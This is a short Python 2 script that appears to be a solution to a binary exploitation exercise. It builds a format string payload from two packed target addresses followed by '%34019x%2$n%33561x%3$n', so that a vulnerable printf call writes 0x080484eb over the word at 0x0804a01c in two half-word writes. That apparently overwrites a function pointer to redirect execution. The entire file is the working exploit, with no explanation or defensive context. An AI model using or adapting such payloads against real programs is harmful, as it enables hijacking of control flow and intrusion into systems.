#!/usr/bin/python
import struct

# write 0x080484eb to 0x0804a01c
target_address          = struct.pack("<I", 0x0804a01c)
target_address_plus_two = struct.pack("<I", 0x0804a01c+2)

# two writes
print target_address + target_address_plus_two + "%34019x%2$n%33561x%3$n"
